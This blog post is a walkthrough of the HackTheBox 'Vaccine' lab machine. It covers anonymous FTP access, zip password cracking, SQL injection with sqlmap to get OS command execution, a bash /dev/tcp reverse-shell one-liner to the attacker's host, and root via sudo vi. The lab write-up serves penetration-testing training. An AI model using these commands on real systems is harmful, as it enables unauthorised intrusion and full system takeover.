---
title: "HackTheBox - Vaccine"
author: Nasrallah
description: ""
date: 2022-07-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, crack, john, zip2john, sqli, sqlmap, vim, sudo]
img_path: /assets/img/hackthebox/machines/vaccine/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Vaccine](https://app.hackthebox.com/starting-point?tier=2) from [HackTheBox](https://www.hackthebox.com). The target is running a ftp server with anonymous login allowed, we login and find a backup.zip file protected with a password, we use zip2john and get a password. The zip file has a index.php file that contains a username and password that we use to login in a webpage. The page has a search section vulnerable to sql injection, we use `sqlmap` to get command execution on the target and a reverse shell after that. Inside the web server's directory, we find a file that has a password for a user, and the latter is able to run a program as root, so we leverage that to get escalate to root.

## Enumeration

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.188.150 (10.129.188.150)
Host is up (1.5s latency).
Not shown: 997 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     vsftpd 3.0.3                                              
| ftp-syst:                 
|   STAT:                                                                      
| FTP server status:
|      Connected to ::ffff:10.10.16.10                                                                                                                        
|      Logged in as ftpuser                                                    
|      TYPE: ASCII
|      No session bandwidth limit                                              
|      Session timeout in seconds is 300
|      Control connection is plain text 
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We found 3 open ports.

 - Port 21 running a FTP server with anonymous login allowed.
 - Port 22 running SSH.
 - Port 80 running Apache web server.

### FTP

Let's login to the ftp server by providing the name `anonymous` and a blank password.

![](1.png)

Logged in successfully and found a file named **backup.zip**, then downloaded it using the command `get backup.zip`.

Let's unzip that file and see what's there.

![](2.png)

The file is protected with a password. We need to use `zip2john` to get a hash of that password and then crack the hash.

![](3.png)

We got the password, let's unzip the file now.

![](4.png)

We extracted two files, *index.php* and *style.css*. They must be the web server's files, let's print the content of index.php.

![](5.png)

Found the username **admin** and a MD5 hash. Let's use [Crackstation](https://crackstation.net/) to crack the hash.

![](6.png)

Great! Now let's move to the web server.

### Web

Let's navigate to the webpage.

![](7.png)

It's a login page for admin corp. Using the credentials we gathered, let's sign in.

![](8.png)

We're in an admin dashboard. Notice that there is a Search section. Everything we type in there get passed to a parameter in the url named `search`.

![](9.png)

## Foothold

Let's give the url to `sqlmap` along with the PHPSESSID cookie and see if the website is vulnerable to sql injection

`sqlmap -u 'http://10.129.188.150/dashboard.php?search=test' --cookie='PHPSESSID=utab5one0605nlfa81p85648p4'`

![](10.png)

The target seems to be vulnerable, let's try to get command execution by adding `--os-shell` option to the sqlmap command.

`sqlmap -u 'http://10.129.188.150/dashboard.php?search=test' --cookie='PHPSESSID=utab5one0605nlfa81p85648p4' --batch --os-shell`

![](11.png)

Nice, we can execute command on the target, but it's not really a shell, so let's get a reverse shell by executing the following command `bash -c "bash -i >& /dev/tcp/{your_IP}/1234 0>&1"`, But we need to setup a netcat listener first`nc -lvnp 1234`.

![](12.png)

Go to the listener and you should see the shell.

![](13.png)

## Privilege Escalation

After getting a shell, i used python pty trick to stabilize the shell.

```terminal
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

"ctrl + z"

stty raw -echo;fg
```

If we go to the website files located in `/var/www/html`, we find the `dashboard.php` file that has passwords for our current user.

![](14.png)

Using the password we found, let's login using ssh.

```terminal
$ ssh postgres@10.129.188.150                                                                                                   
postgres@10.129.188.150's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 Aug 2022 10:58:39 AM UTC

  System load:  0.0               Processes:             184
  Usage of /:   32.6% of 8.73GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.129.188.150
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@vaccine:~$ 
```

Let's check our current privileges with `sudo -l`.

![](15.png)


we can run the `/bin/vi` as root. Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo).

![](16.png)

We open the file with the command `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` and then type these commands.

 - `:set shell=/bin/sh`
 - `:shell`

![](17.png)

Great! We got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
